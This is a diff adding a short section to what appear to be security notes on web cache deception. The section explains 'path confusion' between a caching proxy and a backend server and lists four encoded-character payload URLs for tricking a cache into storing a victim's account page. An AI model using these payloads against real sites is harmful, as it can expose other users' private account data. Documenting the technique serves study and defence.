@@ -12,3 +12,16 @@
 
 - If the page is cached, attacker can visit your account_info by simpley access ```www.example.com/account_info/notexist.css```.
 
+## Path Confustion in Cache Deception
+
+- Path confustion made use of diff decocing of a URL path between proxy and backend server to complete a cache deception attack.
+
+- Some path confustion example of cache deception includes:
+
+```
+www.example.com/account_info%3Fid=1notexist.css
+www.example.com/account_info%0Anotexist.css
+www.example.com/account_info%3Bidnotexist.css
+www.example.com/account_info%23notexist.css
+```
+
